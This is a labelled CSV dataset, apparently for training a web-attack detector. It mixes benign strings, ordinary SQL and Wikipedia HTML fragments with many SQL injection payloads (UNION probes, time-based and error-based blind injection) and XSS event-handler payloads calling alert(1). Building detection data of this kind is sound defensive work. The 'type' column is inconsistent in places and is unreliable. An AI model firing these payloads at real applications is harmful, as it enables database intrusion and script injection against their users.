Text,Label,type
SELECT * FROM period,0,sql
peabody,0,xss
"<li><a href=""/wiki/Climber_(BEAM)"" class=""mw-redirect"" title=""Climber (BEAM)"">Climbing </a> </li>",0,xss
" select * from users where id  =  1 union select @&&@,version  (    )   -- 1",1,sql
SELECT Count ( * )  AS clean,0,sql
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367532 ) ,0,xss
"1""  )   where 5794  =  5794 union all select null,null,null,null,null,null,null,null,null,null#",1,sql
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  # tsxs",1,xss
88341714w,0,sql
-1036'  )   or 6872  =  6872 and   (  'wvbi'  =  'wvbi,1,sql
-8876'   )    )    or 3038  =  3038,1,sql
6.8388E+14,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/leaks.html"">Debugging memory leaks</a></li>",0,xss
"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></image>",2,xss
16,0,xss
SELECT * FROM end 3 SELECT * FROM flag,0,xss
oa,0,sql
32727347a,0,sql
michell4@so-tel.jobs,0,xss
"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
SELECT * FROM serious FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM few,0,xss
-9653'  )   where 2705  =  2705 or 9323  =  9323#,1,sql
"  SELECT three AS halfway, pipe AS [burn]  FROM fallen",0,sql
1%'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',1,sql
fontanarejo,0,sql
SELECT * FROM storm WHERE damage = 'married'  OR cattle = 'pipe',0,sql
<footer onpointerdown=alert(1)>XSS</footer>,2,xss
"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></colgroup>",2,xss
<input type=radio id=x onfocusin=alert(1)>,2,xss
SELECT TOP 50 PERCENT * FROM bone,0,sql
enang.ostar,0,sql
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,sql
SELECT * FROM son WHERE leaf = 'open',0,sql
SELECT AVG ( consonant ) FROM music SELECT SUM ( dinner ) ,0,sql
select   (  case when   (  2676  =  4191  )   then 2676 else 1/  (  select 0  )   end  )  --,1,xss
	 </span>,0,xss
galimany bifet,0,xss
macinnes,0,sql
"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,sql
SELECT MIN (  column_name  )  FROM table_name WHERE condition ;,0,sql
cadek,0,xss
SELECT * FROM place,0,sql
"1""   )    )    as ftts where 3671  =  3671 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
"<ol onmouseup=""alert(1)"">test</ol>",2,xss
1  )   as ratg where 3033  =  3033 union all select null--,1,sql
<summary onpointerout=alert(1)>XSS</summary>,2,xss
"<shadow onkeyup=""alert(1)"" contenteditable>test</shadow>",2,xss
-7548 or 2850  =  9666,1,sql
"-8612'  )   as toeu where 6357  =  6357 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
1  )   where 3936  =  3936,1,sql
-5580 or 4829  =  1968,1,xss
"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1,sql
<embed src=/ onload=alert(1)>,2,xss
<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>,2,xss
desacertadamente,0,sql
SELECT AVG ( yard )  FROM was  SELECT SUM ( factor ) ,0,sql
SELECT third ( s FROM wool RIGHT JOIN,0,sql
thibaut,0,sql
48714518n,0,xss
"<form draggable=""true"" ondragend=""alert(1)"">test</form>",2,xss
SELECT west FROM dinner UNION SELECT task FROM jar ORDER BY wheel,0,sql
SELECT * FROM wind WHERE back = 'how' FETCH FIRST 3 ROWS ONLY,0,sql
"<style>:target {color: red;}</style><col id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></col>",2,xss
j804n86o,0,xss
1'||  (  select 'yydv' from dual where 9639  =  9639,1,sql
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",1,sql
SELECT COUNT ( regular ) FROM clean,0,xss
"<kbd onmouseout=""alert(1)"">test</kbd>",2,xss
" SELECT * FROM giant ORDER BY fix, itself",0,xss
"<spacer onclick=""alert(1)"">test</spacer>",2,xss
"  SELECT primitive,term FROM government WHERE making = 'except' UNION SELECT such, roof FROM consonant",0,sql
"<rp draggable=""true"" ondragleave=""alert(1)"">test</rp>",2,xss
romanones,0,sql
<em onpointerup=alert(1)>XSS</em>,2,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/loaders.html"">Item Loaders</a></li>",0,xss
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,sql
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;901–942, </li>",0,xss
SELECT * FROM zulu WHERE respect LIKE '%death%',0,sql
"<image onmouseleave=""alert(1)"">test</image>",2,xss
<li onpointerover=alert(1)>XSS</li>,2,xss
" </p><p>One proposal to deal with this is to ensure that the first generally intelligent AI is '<a href=""/wiki/Friendly_AI"" class=""mw-redirect"" title=""Friendly AI"">Friendly AI </a>' and will be able to control subsequently developed AIs. Some question whether this kind of check could actually remain in place.",0,xss
duesaiges,0,sql
"etorbidea nafarroa behereko, 162 6?d",0,sql
1  )   as phja where 4627  =  4627,1,sql
SELECT * FROM depend  WHERE escape = mice,0,sql
"<li><a href=""/wiki/Glossary_of_geology"" title=""Glossary of geology"">Geology </a> </li>",0,xss
"  SELECT blind,walk,exciting FROM fastened LEFT JOIN Orders ON heard.sawID =  day.period ORDER BY studied.solid",0,sql
"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",1,sql
"<rtc onmouseup=""alert(1)"">test</rtc>",2,xss
SELECT COUNT ( major ) FROM sets,0,sql
SELECT Count ( * )  AS beyond,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 348492 )  ORDER BY meta_id ASC",0,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c886067718' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
bunyola,0,xss
DELETE FROM present,0,sql
du-tuan,0,sql
"-2718""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""kbvd"" like ""kbvd",1,sql
"<dd onkeypress=""alert(1)"" contenteditable>test</dd>",2,xss
SELECT * FROM bean WHERE morning IN  ( SELECT find FROM selection ) ,0,sql
SELECT fix FROM air UNION ALL SELECT national FROM pale ORDER BY cat,0,xss
SELECT * FROM mouth FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT AVG ( thirty ) FROM eventually SELECT SUM ( special ) ,0,sql
"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",1,sql
</th> ,0,xss
<data id=x tabindex=1 onactivate=alert(1)></data>,2,xss
SELECT AVG ( package ) FROM queen SELECT SUM ( ran ) ,0,sql
"<div oncontextmenu=""alert(1)"">test</div>",2,xss
lengua barrios,0,sql
	 </span> </h4>,0,xss
SELECT MIN ( piano )  AS across FROM copper,0,xss
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1,xss
SELECT * FROM flies  WHERE bit = four,0,sql
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationstart=""alert(1)""></xmp>",2,xss
SELECT MIN ( smile )  AS tree FROM alone,0,sql
sadegh,0,sql
"-4381 or make_set  (  6118  =  3095,3095  )  # lkcr",1,sql
1.86E+15,0,xss
select   (  case when   (  4769  =  4769  )   then 4769 else 4769*  (  select 4769 from mysql.db  )   end  )  #,1,sql
SELECT TOP 50 PERCENT * FROM according SELECT * FROM root FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM bus,0,xss
"1'  )   as xagu where 9088  =  9088   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,xss
<br id=x tabindex=1 onbeforeactivate=alert(1)></br>,2,xss
1  )   where 9446  =  9446 union all select null#,1,sql
1'||  (  select 'sbip' from dual where 7302  =  7302 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',1,xss
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",2,xss
"  SELECT standard,factory,lying FROM receive LEFT JOIN Orders ON dangerous.circusID =  guess.sand ORDER BY us.stems",0,sql
29142280s,0,sql
<object onpointerup=alert(1)>XSS</object>,2,xss
<style onload=alert(1)></style>,2,xss
"-3747""  )   union all select 8962,8962,8962,8962,8962#",1,xss
babasaki,0,sql
SELECT TOP 3 * FROM chart WHERE moment = 'house' SELECT * FROM nearly,0,sql
"<progress onkeydown=""alert(1)"" contenteditable>test</progress>",2,xss
"<body draggable=""true"" ondragenter=""alert(1)"">test</body>",2,xss
 </li>,0,xss
 ,0,xss
"<tfoot onmousedown=""alert(1)"">test</tfoot>",2,xss
SELECT PI (  ) ;,0,sql
SELECT spider ( s )  FROM value SELECT fill ( s ) ,0,sql
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",1,sql
"   SELECT Employees.remarkable, COUNT ( Orders.somehowID )  AS biggerFROM    ( OrdersINNER JOIN realize ON Orders.southID  =  Employees.baseballID ) ",0,xss
<input onpointerup=alert(1)>XSS</input>,2,xss
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,1,sql
"<li><a href=""/wiki/Consilience"" title=""Consilience"">Consilience </a> </li>",0,xss
"<body onmouseleave=""alert(1)"">test</body>",2,xss
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367656 ) ,0,xss
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx",1,sql
SELECT TOP 3 * FROM thought WHERE farm = 'addition',0,sql
SELECT * FROM coming,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
SELECT * FROM all WHERE solution = 'press' LIMIT 3,0,xss
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",1,sql
SELECT * FROM pay FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
 ,0,xss
"1'||  (  select 'sned' where 4957  =  4957 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
"<object onmouseout=""alert(1)"">test</object>",2,xss
 </li>,0,xss
"<style>:target {color: red;}</style><dt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dt>",2,xss
SELECT COUNT ( structure )  FROM date,0,sql
SELECT * FROM entire WHERE chair NOT LIKE 'blanket%',0,sql
-7758%'   )    )     )   or 3038  =  3038,1,sql
nuez de balboa 131 2-f,0,sql
1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,1,sql
"1"" where 3510  =  3510",1,sql
1'+  (  select emeu where 2310  =  2310,1,sql
sappington-espana@fighting-machines.mq,0,sql
58265705n,0,sql
"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",1,sql
SELECT * FROM mouth WHERE excellent IN  ( SELECT birds FROM iron ) ,0,sql
SELECT * FROM belong 3,0,xss
<select onchange=alert(1)><option>change me</option><option>XSS</option></select>,2,xss
 (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,sql
"<style>@keyframes slidein {}</style><thead style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></thead>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.businessinsider.com/mark-zuckerberg-shares-thoughts-elon-musks-ai-2018-5"">""Mark Zuckerberg responds to Elon Musk's paranoia about AI: 'AI is going to... help keep our communities safe.<span class=""cs1-kern-right"">' ",0,xss
SELECT * FROM comfortable WHERE figure = 'production'  AND City = 'wrong',0,sql
villaseca de henares,0,sql
celeste_bryon@skullride.ki,0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></embed>",2,xss
SELECT * FROM long WHERE ten = 'larger'  OR from = 'construction',0,xss
"<figcaption onmouseenter=""alert(1)"">test</figcaption>",2,xss
"1'||  (  select 'xbwg' where 7518  =  7518 union all select null,null,null,null,null,null--",1,sql
<custom tags onpointermove=alert(1)>XSS</custom tags>,2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""egzm""  =  ""egzm",1,sql
" SELECT column_name ( s )  FROM seat,labor",0,sql
vispy,0,sql
"-5165'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'zpnv' like 'zpnv",1,sql
59072549q,0,sql
<animate onpointerup=alert(1)>XSS</animate>,2,xss
"1' union all select null,null,null,null,null,null,null,null--",1,xss
"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",2,xss
 </li>,0,xss
"1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#",1,sql
bolkan@directoriogratuito.int,0,xss
173,0,sql
"1 where 4968  =  4968 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,sql
yuraj,0,xss
"1%""   )    )    union all select null,null,null,null,null#",1,sql
x' and email is NULL; --,1,sql
debicki@prestoesesto.hr,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
 ,0,xss
9.57099E+14,0,sql
clar gabarri,0,sql
"1'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"-1585%""   )    )    union all select 8818,8818,8818,8818,8818,8818#",1,xss
emblanquimiento,0,sql
"<h2>Built-in services<a class=""headerlink"" href=""#built-in-services"" title=""Permalink to this headline"">¶</a></h2>",0,xss
-3083  )   or 5221  =  7829,1,sql
"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",2,xss
80,0,sql
SELECT AVG ( mud )  FROM learn  SELECT SUM ( cannot ) ,0,sql
SELECT COUNT ( frightenID ) FROM soap,0,sql
1 where 6500  =  6500,1,sql
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2F64.336150"">10.1109/64.336150 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Expert&amp;rft.atitle=The+paradoxical+success+of+fuzzy+logic&amp;rft.volume=9&amp;rft.issue=4&amp;rft.pages=3-49&amp;rft.date=1994&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.100.8402&amp;rft_id=info%3Adoi%2F10.1109%2F64.336150&amp;rft.aulast=Elkan&amp;rft.aufirst=Charles&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
7613,0,sql
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,sql
"1   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5349  =  5349",1,sql
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""ikhr""  =  ""ikhr",1,xss
SELECT * FROM bus WHERE question NOT LIKE '[having]%',0,sql
"<li><a href=""/wiki/Evolutionary_robotics"" title=""Evolutionary robotics"">Evolutionary robotics </a> </li>",0,xss
inglis@baltasarsantos.vu,0,sql
"<h2>First steps<a class=""headerlink"" href=""#first-steps"" title=""Permalink to this headline"">¶</a></h2>",0,xss
castellgal,0,sql
spradlin@pcvirus.dz,0,sql
"1%'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   '%'  =  '",1,sql
"1  )   as fgqe where 1526  =  1526 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sql
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,sql
65340567m,0,sql
" SELECT * FROM remove ORDER BY knowledge, yellow",0,sql
22390,0,sql
"-2605%'   )    )     )   union all select 4738,4738#",1,sql
SELECT TOP 50 PERCENT * FROM wet SELECT * FROM inch FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wild,0,sql
"  SELECT tired AS history, slide AS [too]  FROM plenty",0,sql
"<div onkeydown=""alert(1)"" contenteditable>test</div>",2,xss
"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1,xss
"1""  )   where 9248  =  9248",1,sql
"-7350'   )    )     )   union all select 9207,9207,9207,9207--",1,sql
 ,0,xss
<meter onfocusout=alert(1) tabindex=1 id=x></meter><input autofocus>,2,xss
"<area onmouseout=""alert(1)"">test</area>",2,xss
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",1,sql
SELECT * FROM bear WHERE magic BETWEEN 'fort' AND 'typical',0,sql
"<isindex draggable=""true"" ondragend=""alert(1)"">test</isindex>",2,xss
SELECT * FROM dark WHERE physical BETWEEN '1996-07-01' AND '1996-07-31',0,sql
	 </span> 2018 ,0,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
"<li id=""cite_note-50""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-50"">^ </a> </b> ",0,xss
"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",1,sql
5425,0,sql
"<li><a class=""mw-selflink selflink"">Artificial intelligence </a> </li>",0,xss
SELECT DISTINCT history FROM history,0,sql
"<var draggable=""true"" ondragleave=""alert(1)"">test</var>",2,xss
"  SELECT * FROM library WHERE slip IN  ( 'vapor', 'tube', 'area' )  ",0,sql
"  SELECT partsID AS ID, traffic AS sugar FROM felt",0,sql
46562846j,0,xss
1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  ',1,sql
SELECT TOP 3 * FROM belong WHERE old = 'closer' SELECT * FROM him,0,sql
"  SELECT * FROM garage WHERE exactly IN  ( 'above', 'shut', 'becoming' )  ",0,sql
05072293b,0,sql
"<basefont onclick=""alert(1)"">test</basefont>",2,xss
"  SELECT Orders.futurerID, Employees.height, Employees.blow FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tryID ORDER BY Orders.olderID",0,xss
<svg><keygen onload=alert(1)></keygen>,2,xss
"1%""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""%""  =  """,1,sql
"<li><cite id=""CITEREFMoravec1988"" class=""citation book""><a href=""/wiki/Hans_Moravec"" title=""Hans Moravec"">Moravec, Hans </a> (1988). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/mindchildrenfutu00mora""><i>Mind Children </i> </a> ",0,xss
"-5819%""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,1,sql
SELECT * FROM sugar WHERE send NOT BETWEEN 'everybody' AND 'not',0,sql
"<link draggable=""true"" ondrag=""alert(1)"">test</link>",2,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Related topics </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT * FROM somewhere 3 SELECT * FROM damage,0,sql
 ,0,xss
2.03996E+15,0,sql
SELECT * FROM flag WHERE thrown = 'hour'  AND  ( heart = 'spell' OR open = 'massage' ) ,0,sql
"  SELECT * FROM quick WHERE dry NOT IN  ( 'ill', 'canal', 'research' )  ",0,sql
 </li>,0,xss
inistola,0,sql
15,0,sql
"1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
boimorto,0,sql
8110,0,sql
"   SELECT given, scale, chainFROM if WHERE ship  IS NOT NULL",0,sql
SELECT TOP 3 * FROM tropical SELECT * FROM settlers 3SELECT * FROM hide,0,xss
"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
SELECT * FROM pen WHERE complex = 'satisfied'  AND City = 'soldier',0,sql
"<picture oncontextmenu=""alert(1)"">test</picture>",2,xss
"1'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
SELECT lady ( s )  FROM swung,0,sql
SELECT * FROM of WHERE garden = 'observe' FETCH FIRST 3 ROWS ONLY,0,sql
valimir,0,sql
SELECT TOP number | percent column_name FROM table_name WHERE condition ;,0,xss
"  SELECT nextID AS ID, among AS wore FROM sit",0,xss
"<li id=""cite_note-301""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-301"">^ </a> </b> ",0,xss
SELECT * FROM sure WHERE Price NOT BETWEEN 10 AND 20,0,sql
3.54937E+15,0,sql
3.45448E+15,0,sql
Making the Mathematical Objection:,0,xss
"avda. de pablo iglesias, s/n 2?g",0,sql
select   (  case when   (  3076  =  3596  )   then 3076 else 3076*  (  select 3076 from mysql.db  )   end  )  #,1,sql
 </p>,0,xss
ergo226825e,0,xss
SELECT AVG ( shallow ) FROM donkey,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Gillick, Dan; Brunk, Cliff; Vinyals, Oriol; Subramanya, Amarnag (2015). ""Multilingual Language Processing From Bytes"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1512.00103"">1512.00103 </a> ",0,xss
"   SELECT method,success,desk,buy,grandmother     (  (  subject JOIN language ON pile.bat =  pile.such )   INNER JOIN organizationON Orders.alike =  dish.fillID ) ",0,sql
SELECT chemical ( s )  FROM offer UNION,0,xss
SELECT ocean ( s )  FROM wolf UNION,0,sql
SELECT * FROM bottom WHERE fully BETWEEN '1996-07-01' AND '1996-07-31',0,sql
lesire@masqueclases.gn,0,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFDomingos2015"">Domingos 2015 </a>, p.&#160;286. ",0,xss
"1%""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,1,sql
"  SELECT deal,college FROM everybody WHERE active = 'mirror' UNION SELECT cloth, scared FROM indicate",0,xss
"1   )    )    as kgit where 1919  =  1919 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
	 </span> </a>,0,xss
"<svg><path><animateMotion onrepeat=alert(1) dur=""1s"" repeatCount=""2"">",2,xss
SELECT * FROM or WHERE may = 'box' LIMIT 3,0,sql
"<li><a href=""/wiki/Network_security"" title=""Network security"">Network security </a> </li>",0,xss
"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",1,sql
